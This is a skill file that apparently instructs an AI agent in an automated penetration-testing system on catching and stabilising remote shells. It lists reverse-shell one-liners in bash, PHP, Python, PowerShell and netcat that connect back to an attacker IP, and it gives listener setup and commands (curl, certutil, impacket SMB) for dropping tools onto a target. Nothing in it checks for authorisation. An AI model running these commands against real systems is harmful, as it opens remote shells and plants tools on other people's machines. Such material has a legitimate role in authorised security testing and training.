---
name: shell
description: Reverse/bind shell one-liners, listener setup, TTY stabilization, and file transfer. Use whenever an exploit yields RCE and a stable shell is needed.
---

# Shells, TTY upgrade, file transfer

Reference: `kb-internal` `cheatsheets/shell-reverse-cheatsheet.md` and
`cheatsheets/shell-bind-cheatsheet.md`.

## Listener

```bash
rlwrap nc -lvnp <PORT>          # prefer rlwrap for arrow keys/history
# or: socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

## Reverse-shell one-liners (pick by target OS/available binaries)

- `bash -i >& /dev/tcp/ATKNIP/PORT 0>&1`
- `python3 -c 'import socket,subprocess,os;s=socket.socket(...);...'` (see KB for full)
- `php -r '$sock=fsockopen("ATKNIP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- `powershell -nop -c "...New-Object Net.Sockets.TCPClient..."` (see KB)
- `nc -e /bin/sh ATKNIP PORT`, `socat`, or `msfvenom -p ...` meterpreter.

## TTY stabilization (after catching a basic shell)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # or python -c 'import pty;pty.spawn(...)'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
# optionally: stty rows <r> cols <c>
```

For Windows shells, no PTY needed; use `rlwrap`/ConPTY where possible.

## File transfer (drop tools onto the target)

- Linux target, attacker serves: `python3 -m http.server 80` on attacker →
  `curl http://ATKNIP/tool -o tool` or `wget ...`.
- Windows target: `certutil -urlcache -f http://ATKNIP/tool C:\path\tool.exe`,
  `Invoke-WebRequest`, `bitsadmin`, or `impacket-smbserver`.
- SMB share: `impacket-smbserver share . -smb2support` → `copy \\ATKNIP\share\tool.exe`.

## Rules

- **Use the listener port assigned by the orchestrator** (recorded in `notes.md`
  under `## listeners`). Never assume 4444 or reuse another agent's port.
- Record the shell type, listener port, and stabilization steps in `notes.md`.
- If the shell dies, re-check the payload binary/path rather than retrying blindly.
